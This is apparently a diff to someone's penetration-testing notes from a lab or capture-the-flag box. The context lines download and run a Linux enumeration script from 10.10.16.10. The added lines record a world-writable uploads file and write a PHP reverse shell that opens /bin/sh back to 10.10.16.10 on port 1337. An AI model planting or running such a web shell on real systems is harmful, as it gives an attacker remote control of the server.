@@ -83,7 +83,20 @@ wget 10.10.16.10:8000/linux-local-enum.sh
 chmod u+x linux-local-enum.sh
 ./linux-local-enum.sh
   # Ubuntu 16.04.2
+
+uploads/index.html
+  # -rwxrwxrwx  1 root root   14 Dec  4  2017 index.html
+cat << 'EOF' > index.php
+<?php
+$sock=fsockopen("10.10.16.10",1337);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
+?>
+EOF
+
 ```
+
++ TODO
+  - enum script
+  - cron job
 
 ## msf
 
